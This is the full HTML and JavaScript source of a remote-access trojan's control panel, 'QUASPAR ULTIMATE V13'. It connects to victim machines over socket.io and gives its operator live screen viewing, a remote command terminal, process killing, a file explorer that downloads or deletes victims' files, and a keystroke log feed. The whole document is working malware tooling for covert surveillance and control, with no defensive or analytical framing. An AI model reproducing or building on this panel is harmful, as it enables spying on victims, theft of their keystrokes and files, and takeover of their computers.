<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>QUASPAR ULTIMATE V13</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #050505; --panel: #0d0d0d; --accent: #00ff41; --danger: #ff3e3e; --text: #e0e0e0; --border: rgba(255,255,255,0.05); }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Outfit', sans-serif; outline: none; }
        body { background: var(--bg); color: var(--text); display: flex; height: 100vh; overflow: hidden; }
        
        /* SIDEBAR */
        #sidebar { width: 220px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
        .logo { padding: 20px; font-weight: 600; color: var(--accent); text-align: center; border-bottom: 1px solid var(--border); letter-spacing: 2px; }
        #victim-list { flex: 1; overflow-y: auto; padding: 10px; }
        .v-card { padding: 12px; border-radius: 8px; margin-bottom: 5px; cursor: pointer; color: #555; font-size: 13px; transition: 0.2s; border: 1px solid transparent; }
        .v-card.active { background: #111; color: var(--accent); border-color: var(--border); border-left: 3px solid var(--accent); }

        /* MAIN CONTENT */
        #main { flex: 1; display: flex; flex-direction: column; background: #000; position: relative; }
        #header { height: 60px; padding: 0 25px; border-bottom: 1px solid var(--border); display: none; align-items: center; justify-content: space-between; background: var(--panel); }
        #header.active { display: flex; }
        .nav { display: flex; gap: 5px; }
        .nav-btn { padding: 8px 16px; border: none; background: transparent; color: #666; font-size: 12px; cursor: pointer; font-weight: 600; border-radius: 6px; }
        .nav-btn.active { background: var(--accent); color: #000; }

        .page { display: none; flex: 1; overflow: hidden; padding: 20px; flex-direction: column; }
        .page.active { display: flex; }

        /* MONITOR */
        .screen-container { flex: 1; background: #000; border-radius: 12px; border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; overflow: hidden; }
        #screen-view { max-width: 100%; max-height: 100%; object-fit: contain; }

        /* TERMINAL */
        .terminal-box { flex: 1; background: #000; border-radius: 12px; border: 1px solid var(--border); display: flex; flex-direction: column; overflow: hidden; }
        #shell-out { flex: 1; padding: 20px; font-family: 'JetBrains Mono'; font-size: 13px; overflow-y: auto; color: #00ff41; white-space: pre-wrap; line-height: 1.6; }
        #shell-inp { background: #0a0a0a; border: none; padding: 18px; color: #fff; font-family: 'JetBrains Mono'; border-top: 1px solid var(--border); font-size: 14px; }

        /* PROCESSES (TASK MANAGER STYLE) */
        .proc-list { display: flex; flex-direction: column; gap: 4px; overflow-y: auto; }
        .proc-card { background: #0d0d0d; padding: 10px 20px; border-radius: 6px; border: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .proc-info b { font-size: 14px; color: #fff; }
        .proc-count { background: var(--accent); color: #000; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: bold; margin-left: 10px; }
        .kill-btn { background: rgba(255,62,62,0.1); color: var(--danger); border: 1px solid var(--danger); padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 11px; transition: 0.2s; }
        .kill-btn:hover { background: var(--danger); color: #fff; }

        /* EXPLORER */
        .file-box { flex: 1; background: var(--panel); border-radius: 12px; border: 1px solid var(--border); overflow-y: auto; }
        .file-item { padding: 12px 20px; border-bottom: 1px solid rgba(255,255,255,0.02); cursor: pointer; font-size: 13px; display: flex; align-items: center; gap: 12px; }
        .file-item:hover { background: rgba(255,255,255,0.02); }

        /* CONTEXT MENU */
        #ctx { position: fixed; display: none; background: #1a1a1a; border: 1px solid #333; border-radius: 8px; width: 160px; z-index: 1000; padding: 5px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .ctx-item { padding: 10px; font-size: 12px; cursor: pointer; border-radius: 5px; }
        .ctx-item:hover { background: var(--accent); color: #000; }
    </style>
</head>
<body>
    <div id="sidebar"><div class="logo">QUASPAR V13</div><div id="victim-list"></div></div>
    <div id="main">
        <div id="header">
            <span id="target-id" style="font-size: 11px; color: #444;">ID: NONE</span>
            <div class="nav">
                <button class="nav-btn active" onclick="showTab('screen', this)">MONITOR</button>
                <button class="nav-btn" onclick="showTab('shell', this)">TERMINAL</button>
                <button class="nav-btn" onclick="showTab('tasks', this)">PROCESSES</button>
                <button class="nav-btn" onclick="showTab('files', this)">EXPLORER</button>
                <button class="nav-btn" onclick="showTab('keys', this)">KEYLOGS</button>
            </div>
        </div>

        <div id="page-screen" class="page active"><div class="screen-container"><img id="screen-view" src=""></div></div>
        
        <div id="page-shell" class="page">
            <div class="terminal-box">
                <div id="shell-out">Prestige Terminal V13 - Ready for commands...</div>
                <input type="text" id="shell-inp" placeholder="Type command (ls, dir, cd...)" onkeydown="if(event.key==='Enter') sendShell()">
            </div>
        </div>

        <div id="page-tasks" class="page">
            <div id="proc-header" style="margin-bottom:15px; color:#555; font-size:12px;">Uygulamalar (0)</div>
            <div class="proc-list" id="proc-list"></div>
        </div>

        <div id="page-files" class="page">
            <div id="path-txt" style="color:var(--accent); font-size:11px; margin-bottom:10px; font-family:'JetBrains Mono'">C:\</div>
            <div class="file-box" id="file-list"></div>
        </div>

        <div id="page-keys" class="page">
            <div class="file-box" id="key-list"></div>
        </div>
    </div>

    <div id="ctx">
        <div class="ctx-item" onclick="handleCtx('download')">üì• Dosyayƒ± ƒ∞ndir</div>
        <div class="ctx-item" onclick="handleCtx('delete')" style="color:var(--danger)">üóëÔ∏è Sil</div>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let selectedId = "", currentPath = "C:\\", rPath = "";

        socket.on('client_list', list => {
            const cont = document.getElementById('victim-list'); cont.innerHTML = "";
            list.forEach(id => {
                const card = document.createElement('div');
                card.className = `v-card ${id === selectedId ? 'active' : ''}`;
                card.innerHTML = `‚Ä¢ ${id}`;
                card.onclick = () => { selectedId = id; document.getElementById('header').classList.add('active'); document.getElementById('target-id').innerText = "Target: " + id; requestFiles(currentPath); };
                cont.appendChild(card);
            });
        });

        function showTab(t, b) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(n => n.classList.remove('active'));
            document.getElementById('page-'+t).classList.add('active'); b.classList.add('active');
            if(t === 'tasks') socket.emit('send_command', {type:'shell', command:'list_procs_grouped', id:selectedId});
        }

        function sendShell() {
            const inp = document.getElementById('shell-inp'); if(!inp.value || !selectedId) return;
            let cmd = inp.value;
            if(cmd === "ls") cmd = "dir";
            socket.emit('send_command', {type: 'shell', command: cmd, id: selectedId});
            document.getElementById('shell-out').innerHTML += `\n<span style="color:#fff">> ${inp.value}</span>`;
            inp.value = "";
        }

        socket.on('shell_output', data => {
            if(data.id !== selectedId) return;
            if(data.output.startsWith("GROUPED_PROCS:")) {
                const procs = JSON.parse(data.output.replace("GROUPED_PROCS:",""));
                document.getElementById('proc-header').innerText = `Uygulamalar (${procs.length})`;
                const cont = document.getElementById('proc-list'); cont.innerHTML = "";
                procs.forEach(p => {
                    const card = document.createElement('div'); card.className = "proc-card";
                    card.innerHTML = `<div class="proc-info"><b>${p.title}</b><span class="proc-count">${p.count}</span><span style="font-size:10px; color:#444; margin-left:15px">PID: ${p.pid}</span></div><button class="kill-btn" onclick="killProc(${p.pid})">Sonlandƒ±r</button>`;
                    cont.appendChild(card);
                });
            } else if(data.output.startsWith('[{"name"')) {
                const files = JSON.parse(data.output);
                const fL = document.getElementById('file-list'); fL.innerHTML = `<div class="file-item" style="color:#444" onclick="goBack()">.. [Geri Git]</div>`;
                files.forEach(f => {
                    const d = document.createElement('div'); d.className = "file-item";
                    d.innerHTML = `<span>${f.type==='folder'?'üìÅ':'üìÑ'}</span> ${f.name.split(/[\\/]/).pop()}`;
                    d.onclick = () => f.type==='folder' ? requestFiles(f.name) : null;
                    d.oncontextmenu = (e) => { e.preventDefault(); rPath=f.name; const m=document.getElementById('ctx'); m.style.display="block"; m.style.left=e.pageX+"px"; m.style.top=e.pageY+"px"; };
                    fL.appendChild(d);
                });
            } else {
                const out = document.getElementById('shell-out'); out.innerHTML += `\n${data.output}`; out.scrollTop = out.scrollHeight;
            }
        });

        function killProc(pid) { socket.emit('send_command', {type:'shell', command:`kill ${pid}`, id:selectedId}); setTimeout(()=>showTab('tasks', document.querySelectorAll('.nav-btn')[2]), 800); }
        function requestFiles(path) { currentPath = path; document.getElementById('path-txt').innerText = path; socket.emit('send_command', {type: 'shell', command: `dir_json "${path}"`, id: selectedId}); }
        function goBack() { let p = currentPath.split(/[\\/]/).filter(x => x.length > 0); if(p.length > 1) { p.pop(); let n = p.join("\\"); if(n.length==2) n+="\\"; requestFiles(n); } else { requestFiles("C:\\"); } }
        function handleCtx(a) { let c = a==='download' ? `download "${rPath}"` : `delete "${rPath}"`; socket.emit('send_command', {type:'shell', command:c, id:selectedId}); }
        window.onclick = () => document.getElementById('ctx').style.display="none";
        socket.on('update_screen', d => { if(d.id===selectedId) document.getElementById('screen-view').src = "data:image/jpeg;base64,"+d.image; });
        socket.on('new_key', d => { if(d.id===selectedId) { const c = document.getElementById('key-list'); const r = document.createElement('div'); r.style.padding="8px 20px"; r.style.borderBottom="1px solid #111"; r.innerHTML=`<span style="color:#444; font-size:10px;">[${new Date().toLocaleTimeString()}]</span> <span style="color:var(--accent)">${d.key}</span>`; c.appendChild(r); c.scrollTop=c.scrollHeight; }});
    </script>
</body>
</html>